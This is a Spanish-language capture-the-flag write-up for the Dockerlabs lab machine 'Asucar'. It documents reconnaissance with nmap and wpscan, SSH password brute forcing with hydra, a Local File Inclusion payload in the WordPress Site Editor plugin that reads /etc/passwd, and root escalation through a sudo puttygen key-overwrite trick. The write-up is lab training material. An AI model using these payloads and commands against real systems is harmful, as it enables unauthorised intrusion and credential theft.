
# Writeup Template: Maquina `[ Asucar ]`

- Tags: #Asucar
- Dificultad: `[ Media ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina Azucar](https://mega.nz/file/sCtDHbjS#3FdcMCEsKE5Ea0taLVkx9Nt9Oj43fqm4Q6RBKCTOVac)

## Configuracion del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x asucar.zip
sudo bash auto_deploy.sh asucar.tar
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p22,80 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.59 ((DebianSid))
```
---

## Enumeracion de [Servicio Web Principal] `CMS Wordpress`
Tenemos **hostsDiscovery** asi que agregamos a nuestro archivo **/etc/hosts**
```bash
172.17.0.2 asucar.dl
```

direccion **URL** del servicio:
```bash
http://asucar.dl/
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://172.17.0.2/
http://172.17.0.2/ [200 OK] Apache[2.4.59], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.59 (Debian)], IP[172.17.0.2], JQuery[3.7.1], MetaGenerator[WordPress 6.5.3], Script[importmap,module], Title[Asucar Moreno], UncommonHeaders[link], WordPress[6.5.3]
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 172.17.0.2
```

Reporte:
```bash
/wordpress/: Blog
/wp-login.php: Possible admin folder
/readme.html: Wordpress version: 2 
/: WordPress version: 6.5.3
/wp-includes/images/rss.png: Wordpress version 2.2 found.
/wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found
/wp-includes/images/blank.gif: Wordpress version 2.6 found.
/wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
/wp-login.php: Wordpress login page.
/wp-admin/upgrade.php: Wordpress login page.
/readme.html: Interesting, a readme.
```
### Enumeracion WordPress:
Lanzamos una enumeracion agresiva para este servicio:
```bash
wpscan --url http://asucar.dl/ --enumerate u,vp,vt,tt,cb,dbe --plugins-detection aggressive
```

Tenemos un usuario:
```bash
[i] User(s) Identified:

[+] wordpress
```

Lanzamos un ataque de fuerza bruta para este usuario:
```bash
wpscan --url http://asucar.dl --passwords /usr/share/wordlists/rockyou.txt --usernames wordpress
```

### Enumeracion Plugin:
```bash
curl -s -X -GET http://asucar.dl/ | grep "plugin"
```

Nos reporta lo siguiente:
```bash
<link rel='stylesheet' id='general-css' href='http://asucar.dl/wp-content/plugins/site-editor/framework/assets/css/general.min.css?ver=1.1' media='all' />
<link rel='stylesheet' id='css3-animate-css' href='http://asucar.dl/wp-content/plugins/site-editor/framework/assets/css/animate/animate.min.css?ver=6.5.3' media='all' />
<script src="http://asucar.dl/wp-content/plugins/site-editor/framework/assets/js/sed_app_site.min.js?ver=1.0.0" id="sed-app-site-js"></script>
<script src="http://asucar.dl/wp-content/plugins/site-editor/assets/js/livequery/jquery.livequery.min.js?ver=1.0.0" id="jquery-livequery-js"></script>
<script src="http://asucar.dl/wp-content/plugins/site-editor/assets/js/livequery/sed.livequery.min.js?ver=1.0.0" id="sed-livequery-js"></script>
<script src="http://asucar.dl/wp-content/plugins/site-editor/framework/assets/js/animate/wow.min.js?ver=1.0.2" id="wow-animate-js"></script>
<script src="http://asucar.dl/wp-content/plugins/site-editor/framework/assets/js/parallax/jquery.parallax.min.js?ver=1.1.3" id="jquery-parallax-js"></script>
<script src="http://asucar.dl/wp-content/plugins/site-editor/framework/assets/js/render.min.js?ver=1.0.0" id="render-scripts-js"></script>
```

Ahora buscaremos un exploit en caso de que exista uno para la version del plugin **Site-Editor**:
```bash
searchsploit wordpress site editor
```

Tenemos este posible para nuestra version:
```bash
---------------------------------------------------------------------------------------------------
 Exploit Title  |  Path
---------------------------------------------------------------------------------------------------
WordPress Plugin Site Editor 1.1.1 - Local File Inclusion  | php/webapps/44340.txt
```

Revisamos su contenido:
```bash
searchsploit -x php/webapps/44340.txt 
```

Contenido:
```bash
** CVE description **
A Local File Inclusion vulnerability in the Site Editor plugin through 1.1.1 for WordPress allows remote attackers to retrieve arbitrary files via the ajax_path parameter to editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php.

Vulnerable code:
if( isset( $_REQUEST['ajax_path'] ) && is_file( $_REQUEST['ajax_path'] ) && file_exists( $_REQUEST['ajax_path'] ) ){
    require_once $_REQUEST['ajax_path'];
}

https://plugins.trac.wordpress.org/browser/site-editor/trunk/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?rev=1640500#L5

By providing a specially crafted path to the vulnerable parameter, a remote attacker can retrieve the contents of sensitive files on the local system.

** Proof of Concept **
http://<host>/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd

** Solution **
No fix available yet.
```

## Explotacion de Vulnerabilidades
Usaremos esta linea:
```bash
http://<host>/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
```

Asi queda ya adaptada a nuestro objetivo:
```bash
http://asucar.dl/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
```

Ahora que lo ejecutamos logramos obtener el contenido del archivo **passwd**:
```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
mysql:x:100:101:MySQL Server,,,:/nonexistent:/bin/false
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:101:102::/nonexistent:/usr/sbin/nologin
sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
curiosito:x:1000:1000::/home/curiosito:/bin/bash
{"success":true,"data":{"output":[]}}
```

Tenemos este usuario **curiosito** al cual aplicaremos fuerza bruta por **ssh**
```bash
hydra -l curiosito -P /usr/share/wordlists/rockyou.txt -f -t 4 ssh://172.17.0.2
```

### Credenciales Encontradas
Tenemos un usuario valido para el servicio **ssh**
```bash
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: curiosito   password: password1
```
### Vector de Ataque
Ahora que tenemos las credenciales las usaremos para tomar el control del objetivo por **ssh**
```bash
# Reverse shell o acceso inicial
ssh-keygen -R 172.17.0.2 && ssh curiosito@172.17.0.2
```

---

## Escalada de Privilegios
###### Usuario `[ Curiosito ]`:
Listando los permisos para ese usuario:
```bash
sudo -l

User curiosito may run the following commands on a562c37486ba:
    (root) NOPASSWD: /usr/bin/puttygen
```

Ahora explotamos el privilegio:
```bash
puttygen -t rsa -b 2048 -O private-openssh -o ~/.ssh/id
puttygen -L ~/.ssh/id >> ~/.ssh/authorized_keys
sudo puttygen /home/curiosito/.ssh/id -o /root/.ssh/id
sudo puttygen /home/curiosito/.ssh/id -o /root/.ssh/authorized_keys -O public-openssh
```

Ahora desde nuestra maquina atacante descargamos:
```bash
scp curiosito@172.17.0.2:/home/curiosito/.ssh/id .
```

Ahora nos conectamos como **root**:
```bash
# Comando para escalar al usuario: ( root )
ssh -i id root@172.17.0.2
```

---

## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
whoami
root
```

---

## Lecciones Aprendidas
1. Aprendimos a explotar el plugin de wordpress
2. Aprendimos a ejecutar un **LFI** atraves de un plugin vulnerable